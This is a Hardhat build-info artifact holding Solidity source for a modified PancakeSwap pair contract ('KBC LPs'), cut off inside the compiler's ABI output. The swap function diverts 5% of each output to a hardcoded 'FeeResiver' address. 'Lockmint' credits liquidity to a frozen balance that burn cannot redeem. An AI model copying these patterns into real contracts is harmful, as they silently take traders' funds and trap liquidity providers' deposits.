{
	"id": "ee31002a290ed7c2473fbb949e6dd805",
	"_format": "hh-sol-build-info-1",
	"solcVersion": "0.5.16",
	"solcLongVersion": "0.5.16+commit.9c3226ce",
	"input": {
		"language": "Solidity",
		"sources": {
			"src/exchange-protocol/contracts/PancakePair.sol": {
				"content": "// SPDX-License-Identifier: GPL-3.0\npragma solidity =0.5.16;\n\nimport \"./interfaces/IPancakePair.sol\";\nimport \"./PancakeERC20.sol\";\nimport \"./libraries/Math.sol\";\nimport \"./libraries/UQ112x112.sol\";\nimport \"./interfaces/IERC20.sol\";\nimport \"./interfaces/IPancakeFactory.sol\";\nimport \"./interfaces/IPancakeCallee.sol\";\n\ncontract PancakePair is IPancakePair, PancakeERC20 {\n    using SafeMath for uint;\n    using UQ112x112 for uint224;\n\n    address public FeeResiver = 0x358bB1515A41a803aD950D3A0d22B914093DdB80;\n\n    uint public constant MINIMUM_LIQUIDITY = 10 ** 3;\n    bytes4 private constant SELECTOR =\n        bytes4(keccak256(bytes(\"transfer(address,uint256)\")));\n\n    address public factory;\n    address public token0;\n    address public token1;\n    uint public taxfee;\n\n    uint112 private reserve0; // uses single storage slot, accessible via getReserves\n    uint112 private reserve1; // uses single storage slot, accessible via getReserves\n    uint32 private blockTimestampLast; // uses single storage slot, accessible via getReserves\n\n    uint public price0CumulativeLast;\n    uint public price1CumulativeLast;\n    uint public kLast; // reserve0 * reserve1, as of immediately after the most recent liquidity event\n\n    uint private unlocked = 1;\n    modifier lock() {\n        require(unlocked == 1, \"Pancake: LOCKED\");\n        unlocked = 0;\n        _;\n        unlocked = 1;\n    }\n\n    function getReserves()\n        public\n        view\n        returns (\n            uint112 _reserve0,\n            uint112 _reserve1,\n            uint32 _blockTimestampLast\n        )\n    {\n        _reserve0 = reserve0;\n        _reserve1 = reserve1;\n        _blockTimestampLast = blockTimestampLast;\n    }\n\n    function _safeTransfer(address token, address to, uint value) private {\n        (bool success, bytes memory data) = token.call(\n            abi.encodeWithSelector(SELECTOR, to, value)\n        );\n        require(\n            success && (data.length == 0 || abi.decode(data, (bool))),\n            \"Pancake: TRANSFER_FAILED\"\n        );\n    }\n\n    event Mint(address indexed sender, uint amount0, uint amount1);\n    event Burn(\n        address indexed sender,\n        uint amount0,\n        uint amount1,\n        address indexed to\n    );\n    event Swap(\n        address indexed sender,\n        uint amount0In,\n        uint amount1In,\n        uint amount0Out,\n        uint amount1Out,\n        address indexed to\n    );\n    event Sync(uint112 reserve0, uint112 reserve1);\n\n    constructor() public {\n        factory = msg.sender;\n    }\n\n    // called once by the factory at time of deployment\n    function initialize(\n        address _token0,\n        address _token1,\n        uint _taxfee\n    ) external {\n        require(msg.sender == factory, \"Pancake: FORBIDDEN\"); // sufficient check\n        token0 = _token0;\n        token1 = _token1;\n        taxfee = _taxfee;\n    }\n\n    // update reserves and, on the first call per block, price accumulators\n    function _update(\n        uint balance0,\n        uint balance1,\n        uint112 _reserve0,\n        uint112 _reserve1\n    ) private {\n        require(\n            balance0 <= uint112(-1) && balance1 <= uint112(-1),\n            \"Pancake: OVERFLOW\"\n        );\n        uint32 blockTimestamp = uint32(block.timestamp % 2 ** 32);\n        uint32 timeElapsed = blockTimestamp - blockTimestampLast; // overflow is desired\n        if (timeElapsed > 0 && _reserve0 != 0 && _reserve1 != 0) {\n            // * never overflows, and + overflow is desired\n            price0CumulativeLast +=\n                uint(UQ112x112.encode(_reserve1).uqdiv(_reserve0)) *\n                timeElapsed;\n            price1CumulativeLast +=\n                uint(UQ112x112.encode(_reserve0).uqdiv(_reserve1)) *\n                timeElapsed;\n        }\n        reserve0 = uint112(balance0);\n        reserve1 = uint112(balance1);\n        blockTimestampLast = blockTimestamp;\n        emit Sync(reserve0, reserve1);\n    }\n\n    // if fee is on, mint liquidity equivalent to 8/25 of the growth in sqrt(k)\n    function _mintFee(\n        uint112 _reserve0,\n        uint112 _reserve1\n    ) private returns (bool feeOn) {\n        address feeTo = IPancakeFactory(factory).feeTo();\n        feeOn = feeTo != address(0);\n        uint _kLast = kLast; // gas savings\n        if (feeOn) {\n            if (_kLast != 0) {\n                uint rootK = Math.sqrt(uint(_reserve0).mul(_reserve1));\n                uint rootKLast = Math.sqrt(_kLast);\n                if (rootK > rootKLast) {\n                    uint numerator = totalSupply.mul(rootK.sub(rootKLast)).mul(\n                        8\n                    );\n                    uint denominator = rootK.mul(17).add(rootKLast.mul(8));\n                    uint liquidity = numerator / denominator;\n                    if (liquidity > 0) _mint(feeTo, liquidity);\n                }\n            }\n        } else if (_kLast != 0) {\n            kLast = 0;\n        }\n    }\n\n    // this low-level function should be called from a contract which performs important safety checks\n    function mint(address to) external lock returns (uint liquidity) {\n        (uint112 _reserve0, uint112 _reserve1, ) = getReserves(); // gas savings\n        uint balance0 = IERC20(token0).balanceOf(address(this));\n        uint balance1 = IERC20(token1).balanceOf(address(this));\n        uint amount0 = balance0.sub(_reserve0);\n        uint amount1 = balance1.sub(_reserve1);\n\n        bool feeOn = _mintFee(_reserve0, _reserve1);\n        uint _totalSupply = totalSupply; // gas savings, must be defined here since totalSupply can update in _mintFee\n        if (_totalSupply == 0) {\n            liquidity = Math.sqrt(amount0.mul(amount1)).sub(MINIMUM_LIQUIDITY);\n            _mint(address(0), MINIMUM_LIQUIDITY); // permanently lock the first MINIMUM_LIQUIDITY tokens\n        } else {\n            liquidity = Math.min(\n                amount0.mul(_totalSupply) / _reserve0,\n                amount1.mul(_totalSupply) / _reserve1\n            );\n        }\n        require(liquidity > 0, \"Pancake: INSUFFICIENT_LIQUIDITY_MINTED\");\n        _mint(to, liquidity);\n\n        _update(balance0, balance1, _reserve0, _reserve1);\n        if (feeOn) kLast = uint(reserve0).mul(reserve1); // reserve0 and reserve1 are up-to-date\n        emit Mint(msg.sender, amount0, amount1);\n    }\n\n    // this low-level function should be called from a contract which performs important safety checks\n    function Lockmint(address to) external lock returns (uint liquidity) {\n        (uint112 _reserve0, uint112 _reserve1, ) = getReserves(); // gas savings\n        uint balance0 = IERC20(token0).balanceOf(address(this));\n        uint balance1 = IERC20(token1).balanceOf(address(this));\n        uint amount0 = balance0.sub(_reserve0);\n        uint amount1 = balance1.sub(_reserve1);\n\n        bool feeOn = _mintFee(_reserve0, _reserve1);\n        uint _totalSupply = totalSupply; // gas savings, must be defined here since totalSupply can update in _mintFee\n        if (_totalSupply == 0) {\n            liquidity = Math.sqrt(amount0.mul(amount1)).sub(MINIMUM_LIQUIDITY);\n            freezeMint(address(0), MINIMUM_LIQUIDITY); // permanently lock the first MINIMUM_LIQUIDITY tokens\n        } else {\n            liquidity = Math.min(\n                amount0.mul(_totalSupply) / _reserve0,\n                amount1.mul(_totalSupply) / _reserve1\n            );\n        }\n        require(liquidity > 0, \"UniswapV2: INSUFFICIENT_LIQUIDITY_MINTED\");\n        freezeMint(to, liquidity);\n\n        _update(balance0, balance1, _reserve0, _reserve1);\n        if (feeOn) kLast = uint(reserve0).mul(reserve1); // reserve0 and reserve1 are up-to-date\n        emit Mint(msg.sender, amount0, amount1);\n    }\n\n    // this low-level function should be called from a contract which performs important safety checks\n    function burn(\n        address to\n    ) external lock returns (uint amount0, uint amount1) {\n        (uint112 _reserve0, uint112 _reserve1, ) = getReserves(); // gas savings\n        address _token0 = token0; // gas savings\n        address _token1 = token1; // gas savings\n        uint balance0 = IERC20(_token0).balanceOf(address(this));\n        uint balance1 = IERC20(_token1).balanceOf(address(this));\n        uint liquidity = balanceOf[address(this)];\n\n        bool feeOn = _mintFee(_reserve0, _reserve1);\n        uint _totalSupply = totalSupply; // gas savings, must be defined here since totalSupply can update in _mintFee\n        amount0 = liquidity.mul(balance0) / _totalSupply; // using balances ensures pro-rata distribution\n        amount1 = liquidity.mul(balance1) / _totalSupply; // using balances ensures pro-rata distribution\n        require(\n            amount0 > 0 && amount1 > 0,\n            \"Pancake: INSUFFICIENT_LIQUIDITY_BURNED\"\n        );\n        _burn(address(this), liquidity);\n        _safeTransfer(_token0, to, amount0);\n        _safeTransfer(_token1, to, amount1);\n        balance0 = IERC20(_token0).balanceOf(address(this));\n        balance1 = IERC20(_token1).balanceOf(address(this));\n\n        _update(balance0, balance1, _reserve0, _reserve1);\n        if (feeOn) kLast = uint(reserve0).mul(reserve1); // reserve0 and reserve1 are up-to-date\n        emit Burn(msg.sender, amount0, amount1, to);\n    }\n\n    //og\n    // this low-level function should be called from a contract which performs important safety checks\n    /*    function swap(\n        uint amount0Out,\n        uint amount1Out,\n        address to,\n        bytes calldata data\n    ) external lock {\n        require(\n            amount0Out > 0 || amount1Out > 0,\n            \"Pancake: INSUFFICIENT_OUTPUT_AMOUNT\"\n        );\n        (uint112 _reserve0, uint112 _reserve1, ) = getReserves(); // gas savings\n        require(\n            amount0Out < _reserve0 && amount1Out < _reserve1,\n            \"Pancake: INSUFFICIENT_LIQUIDITY\"\n        );\n\n        uint balance0;\n        uint balance1;\n        {\n            // scope for _token{0,1}, avoids stack too deep errors\n            address _token0 = token0;\n            address _token1 = token1;\n            require(to != _token0 && to != _token1, \"Pancake: INVALID_TO\");\n            if (amount0Out > 0) _safeTransfer(_token0, to, amount0Out); // optimistically transfer tokens\n            if (amount1Out > 0) _safeTransfer(_token1, to, amount1Out); // optimistically transfer tokens\n            if (data.length > 0)\n                IPancakeCallee(to).pancakeCall(\n                    msg.sender,\n                    amount0Out,\n                    amount1Out,\n                    data\n                );\n            balance0 = IERC20(_token0).balanceOf(address(this));\n            balance1 = IERC20(_token1).balanceOf(address(this));\n        }\n        uint amount0In = balance0 > _reserve0 - amount0Out\n            ? balance0 - (_reserve0 - amount0Out)\n            : 0;\n        uint amount1In = balance1 > _reserve1 - amount1Out\n            ? balance1 - (_reserve1 - amount1Out)\n            : 0;\n        require(\n            amount0In > 0 || amount1In > 0,\n            \"Pancake: INSUFFICIENT_INPUT_AMOUNT\"\n        );\n        {\n            // scope for reserve{0,1}Adjusted, avoids stack too deep errors\n            uint balance0Adjusted = (\n                balance0.mul(10000).sub(amount0In.mul(25))\n            );\n            uint balance1Adjusted = (\n                balance1.mul(10000).sub(amount1In.mul(25))\n            );\n            require(\n                balance0Adjusted.mul(balance1Adjusted) >=\n                    uint(_reserve0).mul(_reserve1).mul(10000 ** 2),\n                \"Pancake: K\"\n            );\n        }\n\n        _update(balance0, balance1, _reserve0, _reserve1);\n        emit Swap(msg.sender, amount0In, amount1In, amount0Out, amount1Out, to);\n    }\n*/\n    // custom\n\n    function swap(\n        uint amount0Out,\n        uint amount1Out,\n        address to,\n        bytes calldata data\n    ) external lock {\n        require(\n            amount0Out > 0 || amount1Out > 0,\n            \"Pancake: INSUFFICIENT_OUTPUT_AMOUNT\"\n        );\n        (uint112 _reserve0, uint112 _reserve1, ) = getReserves(); // gas savings\n        require(\n            amount0Out < _reserve0 && amount1Out < _reserve1,\n            \"Pancake: INSUFFICIENT_LIQUIDITY\"\n        );\n\n        uint balance0;\n        uint balance1;\n        {\n            uint taxamount0Out = amount0Out - (amount0Out * 5) / 100;\n            uint taxamount1Out = amount1Out - (amount1Out * 5) / 100;\n\n            // scope for _token{0,1}, avoids stack too deep errors\n            address _token0 = token0;\n            address _token1 = token1;\n            require(to != _token0 && to != _token1, \"Pancake: INVALID_TO\");\n            if (amount0Out > 0) _safeTransfer(_token0, to, taxamount0Out); // optimistically transfer tokens\n            if (amount1Out > 0) _safeTransfer(_token1, to, taxamount1Out); // optimistically transfer tokens\n            if (data.length > 0)\n                IPancakeCallee(to).pancakeCall(\n                    msg.sender,\n                    taxamount0Out, // amount0Out,\n                    taxamount1Out, //  amount1Out,\n                    data\n                );\n\n            uint tax0 = (amount0Out * 5) / 100;\n            uint tax1 = (amount1Out * 5) / 100;\n\n            if (amount0Out > 0) _safeTransfer(_token0, FeeResiver, tax0); // optimistically transfer tokens\n            if (amount1Out > 0) _safeTransfer(_token1, FeeResiver, tax1); // optimistically transfer tokens\n            balance0 = IERC20(_token0).balanceOf(address(this));\n            balance1 = IERC20(_token1).balanceOf(address(this));\n        }\n        uint amount0In = balance0 > _reserve0 - amount0Out\n            ? balance0 - (_reserve0 - amount0Out)\n            : 0;\n        uint amount1In = balance1 > _reserve1 - amount1Out\n            ? balance1 - (_reserve1 - amount1Out)\n            : 0;\n        require(\n            amount0In > 0 || amount1In > 0,\n            \"Pancake: INSUFFICIENT_INPUT_AMOUNT\"\n        );\n        {\n            // scope for reserve{0,1}Adjusted, avoids stack too deep errors\n            uint balance0Adjusted = (\n                balance0.mul(10000).sub(amount0In.mul(25))\n            );\n            uint balance1Adjusted = (\n                balance1.mul(10000).sub(amount1In.mul(25))\n            );\n            require(\n                balance0Adjusted.mul(balance1Adjusted) >=\n                    uint(_reserve0).mul(_reserve1).mul(10000 ** 2),\n                \"Pancake: K\"\n            );\n        }\n\n        _update(balance0, balance1, _reserve0, _reserve1);\n        emit Swap(msg.sender, amount0In, amount1In, amount0Out, amount1Out, to);\n    }\n\n    /*  // this low-level function should be called from a contract which performs important safety checks\n    function swap(\n        uint amount0Out,\n        uint amount1Out,\n        address to,\n        bytes calldata data\n    ) external lock {\n        require(\n            amount0Out > 0 || amount1Out > 0,\n            \"UniswapV2: INSUFFICIENT_OUTPUT_AMOUNT\"\n        );\n        (uint112 _reserve0, uint112 _reserve1, ) = getReserves(); // gas savings\n        require(\n            amount0Out < _reserve0 && amount1Out < _reserve1,\n            \"UniswapV2: INSUFFICIENT_LIQUIDITY\"\n        );\n\n        uint balance0;\n        uint balance1;\n\n        {\n            // scope for _token{0,1}, avoids stack too deep errors\n            address _token0 = token0;\n            address _token1 = token1;\n\n            uint taxamount0Out = amount0Out - (amount0Out * 5) / 100;\n            uint taxamount1Out = amount1Out - (amount1Out * 5) / 100;\n\n            require(to != _token0 && to != _token1, \"UniswapV2: INVALID_TO\");\n\n            if (amount0Out > 0) _safeTransfer(_token0, to, taxamount0Out); // optimistically transfer tokens\n            if (amount1Out > 0) _safeTransfer(_token1, to, taxamount1Out); // optimistically transfer tokens\n            // if (data.length > 0) IUniswapV2Callee(to).uniswapV2Call(msg.sender, amount0Out, amount1Out, data);\n            if (data.length > 0)\n                IPancakeCallee(to).pancakeCall(\n                    msg.sender,\n                    taxamount0Out,\n                    taxamount1Out,\n                    data\n                );\n            uint tax0 = (amount0Out * 5) / 100;\n            uint tax1 = (amount1Out * 5) / 100;\n\n            if (amount0Out > 0) _safeTransfer(_token0, FeeResiver, tax0); // optimistically transfer tokens\n            if (amount1Out > 0) _safeTransfer(_token1, FeeResiver, tax1); // optimistically transfer tokens\n            // _safeTransfer(_token0, FeeResiver, tax0);\n            // _safeTransfer(_token1, FeeResiver, tax1);\n\n            balance0 = IERC20(_token0).balanceOf(address(this));\n            balance1 = IERC20(_token1).balanceOf(address(this));\n        }\n\n        uint amount0In = balance0 > _reserve0 - amount0Out\n            ? balance0 - (_reserve0 - amount0Out)\n            : 0;\n        uint amount1In = balance1 > _reserve1 - amount1Out\n            ? balance1 - (_reserve1 - amount1Out)\n            : 0;\n        require(\n            amount0In > 0 || amount1In > 0,\n            \"UniswapV2: INSUFFICIENT_INPUT_AMOUNT\"\n        );\n        {\n            // scope for reserve{0,1}Adjusted, avoids stack too deep errors\n             uint balance0Adjusted = balance0.mul(1000).sub(amount0In.mul(3));\n              uint balance1Adjusted = balance1.mul(1000).sub(amount1In.mul(3));\n              require(\n                balance0Adjusted.mul(balance1Adjusted) >=\n                    uint(_reserve0).mul(_reserve1).mul(1000 ** 2),\n                \"UniswapV2: K\"\n            ); \n        }\n\n        _update(balance0, balance1, _reserve0, _reserve1);\n        emit Swap(msg.sender, amount0In, amount1In, amount0Out, amount1Out, to);\n        // emit Swap(msg.sender, amount0In, amount1In, taxamount0Out0, taxamount1Out1, to);\n    }\n*/\n\n    // force balances to match reserves\n    function skim(address to) external lock {\n        address _token0 = token0; // gas savings\n        address _token1 = token1; // gas savings\n        _safeTransfer(\n            _token0,\n            to,\n            IERC20(_token0).balanceOf(address(this)).sub(reserve0)\n        );\n        _safeTransfer(\n            _token1,\n            to,\n            IERC20(_token1).balanceOf(address(this)).sub(reserve1)\n        );\n    }\n\n    // force reserves to match balances\n    function sync() external lock {\n        _update(\n            IERC20(token0).balanceOf(address(this)),\n            IERC20(token1).balanceOf(address(this)),\n            reserve0,\n            reserve1\n        );\n    }\n}\n"
			},
			"src/exchange-protocol/contracts/interfaces/IPancakeCallee.sol": {
				"content": "// SPDX-License-Identifier: GPL-3.0\npragma solidity >=0.5.0;\n\ninterface IPancakeCallee {\n    function pancakeCall(\n        address sender,\n        uint256 amount0,\n        uint256 amount1,\n        bytes calldata data\n    ) external;\n}\n"
			},
			"src/exchange-protocol/contracts/interfaces/IPancakeFactory.sol": {
				"content": "// SPDX-License-Identifier: GPL-3.0\npragma solidity >=0.5.0;\n\ninterface IPancakeFactory {\n    event PairCreated(address indexed token0, address indexed token1, address pair, uint256);\n\n    function feeTo() external view returns (address);\n\n    function feeToSetter() external view returns (address);\n\n    function getPair(address tokenA, address tokenB) external view returns (address pair);\n\n    function allPairs(uint256) external view returns (address pair);\n\n    function allPairsLength() external view returns (uint256);\n\n    function createPair(address tokenA, address tokenB) external returns (address pair);\n\n    function setFeeTo(address) external;\n\n    function setFeeToSetter(address) external;\n\n    function INIT_CODE_PAIR_HASH() external view returns (bytes32);\n}\n"
			},
			"src/exchange-protocol/contracts/interfaces/IERC20.sol": {
				"content": "// SPDX-License-Identifier: GPL-3.0\npragma solidity >=0.5.0;\n\ninterface IERC20 {\n    event Approval(address indexed owner, address indexed spender, uint256 value);\n    event Transfer(address indexed from, address indexed to, uint256 value);\n\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address owner) external view returns (uint256);\n\n    function allowance(address owner, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 value) external returns (bool);\n\n    function transfer(address to, uint256 value) external returns (bool);\n\n    function transferFrom(\n        address from,\n        address to,\n        uint256 value\n    ) external returns (bool);\n}\n"
			},
			"src/exchange-protocol/contracts/libraries/UQ112x112.sol": {
				"content": "// SPDX-License-Identifier: GPL-3.0\npragma solidity =0.5.16;\n\n// a library for handling binary fixed point numbers (https://en.wikipedia.org/wiki/Q_(number_format))\n\n// range: [0, 2**112 - 1]\n// resolution: 1 / 2**112\n\nlibrary UQ112x112 {\n    uint224 constant Q112 = 2**112;\n\n    // encode a uint112 as a UQ112x112\n    function encode(uint112 y) internal pure returns (uint224 z) {\n        z = uint224(y) * Q112; // never overflows\n    }\n\n    // divide a UQ112x112 by a uint112, returning a UQ112x112\n    function uqdiv(uint224 x, uint112 y) internal pure returns (uint224 z) {\n        z = x / uint224(y);\n    }\n}\n"
			},
			"src/exchange-protocol/contracts/libraries/Math.sol": {
				"content": "// SPDX-License-Identifier: GPL-3.0\npragma solidity =0.5.16;\n\n// a library for performing various math operations\n\nlibrary Math {\n    function min(uint256 x, uint256 y) internal pure returns (uint256 z) {\n        z = x < y ? x : y;\n    }\n\n    // babylonian method (https://en.wikipedia.org/wiki/Methods_of_computing_square_roots#Babylonian_method)\n    function sqrt(uint256 y) internal pure returns (uint256 z) {\n        if (y > 3) {\n            z = y;\n            uint256 x = y / 2 + 1;\n            while (x < z) {\n                z = x;\n                x = (y / x + x) / 2;\n            }\n        } else if (y != 0) {\n            z = 1;\n        }\n    }\n}\n"
			},
			"src/exchange-protocol/contracts/PancakeERC20.sol": {
				"content": "// SPDX-License-Identifier: GPL-3.0\npragma solidity =0.5.16;\n\nimport \"./interfaces/IPancakeERC20.sol\";\nimport \"./libraries/SafeMath.sol\";\n\ncontract PancakeERC20 is IPancakeERC20 {\n    using SafeMath for uint256;\n\n    string public constant name = \"KBC LPs\";\n    string public constant symbol = \"KBC-LP\";\n    uint8 public constant decimals = 18;\n    uint256 public totalSupply;\n    mapping(address => uint256) public balanceOf;\n    mapping(address => mapping(address => uint256)) public allowance;\n    mapping(address => uint256) public _frozenBalance;\n\n    bytes32 public DOMAIN_SEPARATOR;\n    // keccak256(\"Permit(address owner,address spender,uint256 value,uint256 nonce,uint256 deadline)\");\n    bytes32 public constant PERMIT_TYPEHASH =\n        0x6e71edae12b1b97f4d1f60370fef10105fa2faae0126114a169c64845d6126c9;\n    mapping(address => uint256) public nonces;\n\n    event Approval(\n        address indexed owner,\n        address indexed spender,\n        uint256 value\n    );\n    event Transfer(address indexed from, address indexed to, uint256 value);\n\n    constructor() public {\n        uint256 chainId;\n        assembly {\n            chainId := chainid\n        }\n        DOMAIN_SEPARATOR = keccak256(\n            abi.encode(\n                keccak256(\n                    \"EIP712Domain(string name,string version,uint256 chainId,address verifyingContract)\"\n                ),\n                keccak256(bytes(name)),\n                keccak256(bytes(\"1\")),\n                chainId,\n                address(this)\n            )\n        );\n    }\n\n    function _mint(address to, uint256 value) internal {\n        totalSupply = totalSupply.add(value);\n        balanceOf[to] = balanceOf[to].add(value);\n        emit Transfer(address(0), to, value);\n    }\n\n    function freezeMint(\n        address account,\n        uint256 amount\n    ) internal returns (bool) {\n        // custom\n        // override\n        require(account != address(0), \"BEP20: mint to the zero address\");\n        // require(owners[msg.sender],\"only Owner freeze Token\");\n        totalSupply = totalSupply.add(amount);\n        _frozenBalance[account] = _frozenBalance[account].add(amount);\n        emit Transfer(address(0), account, amount);\n        return true;\n    }\n\n    function _burn(address from, uint256 value) internal {\n        balanceOf[from] = balanceOf[from].sub(value);\n        totalSupply = totalSupply.sub(value);\n        emit Transfer(from, address(0), value);\n    }\n\n    function _approve(address owner, address spender, uint256 value) private {\n        allowance[owner][spender] = value;\n        emit Approval(owner, spender, value);\n    }\n\n    function _transfer(address from, address to, uint256 value) private {\n        balanceOf[from] = balanceOf[from].sub(value);\n        balanceOf[to] = balanceOf[to].add(value);\n        emit Transfer(from, to, value);\n    }\n\n    function approve(address spender, uint256 value) external returns (bool) {\n        _approve(msg.sender, spender, value);\n        return true;\n    }\n\n    function transfer(address to, uint256 value) external returns (bool) {\n        _transfer(msg.sender, to, value);\n        return true;\n    }\n\n    function transferFrom(\n        address from,\n        address to,\n        uint256 value\n    ) external returns (bool) {\n        if (allowance[from][msg.sender] != uint256(-1)) {\n            allowance[from][msg.sender] = allowance[from][msg.sender].sub(\n                value\n            );\n        }\n        _transfer(from, to, value);\n        return true;\n    }\n\n    function permit(\n        address owner,\n        address spender,\n        uint256 value,\n        uint256 deadline,\n        uint8 v,\n        bytes32 r,\n        bytes32 s\n    ) external {\n        require(deadline >= block.timestamp, \"Pancake: EXPIRED\");\n        bytes32 digest = keccak256(\n            abi.encodePacked(\n                \"\\x19\\x01\",\n                DOMAIN_SEPARATOR,\n                keccak256(\n                    abi.encode(\n                        PERMIT_TYPEHASH,\n                        owner,\n                        spender,\n                        value,\n                        nonces[owner]++,\n                        deadline\n                    )\n                )\n            )\n        );\n        address recoveredAddress = ecrecover(digest, v, r, s);\n        require(\n            recoveredAddress != address(0) && recoveredAddress == owner,\n            \"Pancake: INVALID_SIGNATURE\"\n        );\n        _approve(owner, spender, value);\n    }\n}\n"
			},
			"src/exchange-protocol/contracts/interfaces/IPancakePair.sol": {
				"content": "// SPDX-License-Identifier: GPL-3.0\npragma solidity >=0.5.0;\n\ninterface IPancakePair {\n    event Approval(\n        address indexed owner,\n        address indexed spender,\n        uint256 value\n    );\n    event Transfer(address indexed from, address indexed to, uint256 value);\n\n    function name() external pure returns (string memory);\n\n    function symbol() external pure returns (string memory);\n\n    function decimals() external pure returns (uint8);\n\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address owner) external view returns (uint256);\n\n    function allowance(\n        address owner,\n        address spender\n    ) external view returns (uint256);\n\n    function approve(address spender, uint256 value) external returns (bool);\n\n    function transfer(address to, uint256 value) external returns (bool);\n\n    function transferFrom(\n        address from,\n        address to,\n        uint256 value\n    ) external returns (bool);\n\n    function DOMAIN_SEPARATOR() external view returns (bytes32);\n\n    function PERMIT_TYPEHASH() external pure returns (bytes32);\n\n    function nonces(address owner) external view returns (uint256);\n\n    function permit(\n        address owner,\n        address spender,\n        uint256 value,\n        uint256 deadline,\n        uint8 v,\n        bytes32 r,\n        bytes32 s\n    ) external;\n\n    event Mint(address indexed sender, uint256 amount0, uint256 amount1);\n    event Burn(\n        address indexed sender,\n        uint256 amount0,\n        uint256 amount1,\n        address indexed to\n    );\n    event Swap(\n        address indexed sender,\n        uint256 amount0In,\n        uint256 amount1In,\n        uint256 amount0Out,\n        uint256 amount1Out,\n        address indexed to\n    );\n    event Sync(uint112 reserve0, uint112 reserve1);\n\n    function MINIMUM_LIQUIDITY() external pure returns (uint256);\n\n    function factory() external view returns (address);\n\n    function token0() external view returns (address);\n\n    function token1() external view returns (address);\n\n    function getReserves()\n        external\n        view\n        returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);\n\n    function price0CumulativeLast() external view returns (uint256);\n\n    function price1CumulativeLast() external view returns (uint256);\n\n    function kLast() external view returns (uint256);\n\n    function mint(address to) external returns (uint256 liquidity);\n\n    function Lockmint(address to) external returns (uint256 liquidity); // custom\n\n    function burn(\n        address to\n    ) external returns (uint256 amount0, uint256 amount1);\n\n    function swap(\n        uint256 amount0Out,\n        uint256 amount1Out,\n        address to,\n        bytes calldata data\n    ) external;\n\n    function skim(address to) external;\n\n    function sync() external;\n\n    function initialize(address, address, uint) external; // custom\n}\n"
			},
			"src/exchange-protocol/contracts/libraries/SafeMath.sol": {
				"content": "// SPDX-License-Identifier: GPL-3.0\npragma solidity >=0.5.0 <0.7.0;\n\n// a library for performing overflow-safe math, courtesy of DappHub (https://github.com/dapphub/ds-math)\n\nlibrary SafeMath {\n    function add(uint256 x, uint256 y) internal pure returns (uint256 z) {\n        require((z = x + y) >= x, \"ds-math-add-overflow\");\n    }\n\n    function sub(uint256 x, uint256 y) internal pure returns (uint256 z) {\n        require((z = x - y) <= x, \"ds-math-sub-underflow\");\n    }\n\n    function mul(uint256 x, uint256 y) internal pure returns (uint256 z) {\n        require(y == 0 || (z = x * y) / y == x, \"ds-math-mul-overflow\");\n    }\n}\n"
			},
			"src/exchange-protocol/contracts/interfaces/IPancakeERC20.sol": {
				"content": "// SPDX-License-Identifier: GPL-3.0\npragma solidity >=0.5.0;\n\ninterface IPancakeERC20 {\n    event Approval(\n        address indexed owner,\n        address indexed spender,\n        uint256 value\n    );\n    event Transfer(address indexed from, address indexed to, uint256 value);\n\n    function name() external pure returns (string memory);\n\n    function symbol() external pure returns (string memory);\n\n    function decimals() external pure returns (uint8);\n\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address owner) external view returns (uint256);\n\n    function allowance(\n        address owner,\n        address spender\n    ) external view returns (uint256);\n\n    function approve(address spender, uint256 value) external returns (bool);\n\n    function transfer(address to, uint256 value) external returns (bool);\n\n    function transferFrom(\n        address from,\n        address to,\n        uint256 value\n    ) external returns (bool);\n\n    function DOMAIN_SEPARATOR() external view returns (bytes32);\n\n    function PERMIT_TYPEHASH() external pure returns (bytes32);\n\n    function nonces(address owner) external view returns (uint256);\n\n    function permit(\n        address owner,\n        address spender,\n        uint256 value,\n        uint256 deadline,\n        uint8 v,\n        bytes32 r,\n        bytes32 s\n    ) external;\n}\n"
			}
		},
		"settings": {
			"optimizer": {
				"enabled": true,
				"runs": 200
			},
			"outputSelection": {
				"*": {
					"": [
						"ast"
					],
					"*": [
						"abi",
						"metadata",
						"devdoc",
						"userdoc",
						"storageLayout",
						"evm.legacyAssembly",
						"evm.bytecode",
						"evm.deployedBytecode",
						"evm.methodIdentifiers",
						"evm.gasEstimates",
						"evm.assembly"
					]
				}
			},
			"remappings": []
		}
	},
	"output": {
		"contracts": {
			"src/exchange-protocol/contracts/PancakeERC20.sol": {
				"PancakeERC20": {
					"abi": [
						{
							"inputs": [],
							"payable": false,
							"stateMutability": "nonpayable",
							"type": "constructor"
						},
						{
							"anonymous": false,
							"inputs": [
								{
									"indexed": true,
									"internalType": "address",
									"name": "owner",
									"type": "address"
								},
								{
									"indexed": true,
									"internalType": "address",
									"name": "spender",
									"type": "address"
								},
								{
									"indexed": false,
									"internalType": "uint256",
									"name": "value",
									"type": "uint256"
								}
							],
							"name": "Approval",
							"type": "event"
						},
						{
							"anonymous": false,
							"inputs": [
								{
									"indexed": true,
									"internalType": "address",
									"name": "from",
									"type": "address"
								},
								{
									"indexed": true,
									"internalType": "address",
									"name": "to",
									"type": "address"
								},
								{
									"indexed": false,
									"internalType": "uint256",
									"name": "value",
									"type": "uint256"
								}
							],
							"name": "Transfer",
							"type": "event"
						},
						{
							"constant": true,
							"inputs": [],
							"name": "DOMAIN_SEPARATOR",
							"outputs": [
								{
									"internalType": "bytes32",
									"name": "",
									"type": "bytes32"
								}
							],
							"payable": false,
							"stateMutability": "view",
							"type": "function"
						},
						{
							"constant": true,
							"inputs": [],
							"name": "PERMIT_TYPEHASH",
							"outputs": [
								{
									"internalType": "bytes32",
									"name": "",
									"type": "bytes32"
								}
							],
							"payable": false,
							"stateMutability": "view",
							"type": "function"
						},
						{
							"constant": true,
							"inputs": [
								{
									"internalType": "address",
									"name": "",
									"type": "address"
								}
							],
							"name": "_frozenBalance",
							"outputs": [
								{
									"internalType": "uint256",
									"name": "",
									"type": "uint256"
								}
							],
							"payable": false,
							"stateMutability": "view",
							"type": "function"
						},
						{
							"constant": true,
							"inputs": [
								{
									"internalType": "address",
									"name": "",
									"type": "address"
								},
								{
									"internalType": "address",
									"name": "",
									"type": "address"
								}
							],
							"name": "allowance",
							"outputs": [
								{
									"internalType": "uint256",
									"name": "",
									"type": "uint256"
								}
							],
							"payable": false,
							"stateMutability": "view",
							"type": "function"
						},
						{
							"constant": false,
							"inputs": [
								{
									"internalType": "address",
									"name": "spender",
